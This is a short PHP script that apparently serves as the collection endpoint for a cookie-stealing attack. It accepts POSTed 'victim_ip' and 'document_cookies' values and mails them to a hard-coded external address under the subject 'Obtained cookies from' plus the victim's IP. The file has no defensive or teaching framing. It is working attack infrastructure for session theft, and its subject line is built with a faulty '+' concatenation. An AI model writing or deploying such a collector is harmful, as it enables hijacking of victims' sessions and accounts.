<?php

if(!empty($_POST)){
  $to = "shodantltwb@proton.me";
  
  if(isset($_POST['victim_ip'])){
    $subject = "Obtained cookies from " + $_POST['victim_ip'];
  } else {
    header("HTTP/1.1 400 Bad Request");
    exit(); 
  }

  if(isset($_POST['document_cookies'])){
    $message = $_POST['document_cookies'];
  } else {
    header("HTTP/1.1 400 Bad Request");
    exit();
  }
  
  if(mail($to, $subject, $message)){
    header("HTTP/1.1 200 OK");
    exit();
  } else {
    header("HTTP/1.1 418 I'm a teapot");      // get fucked   
    exit();
  }

} else {
  header("HTTP/1.1 405 Method Not Allowed");
  exit();
}

?>
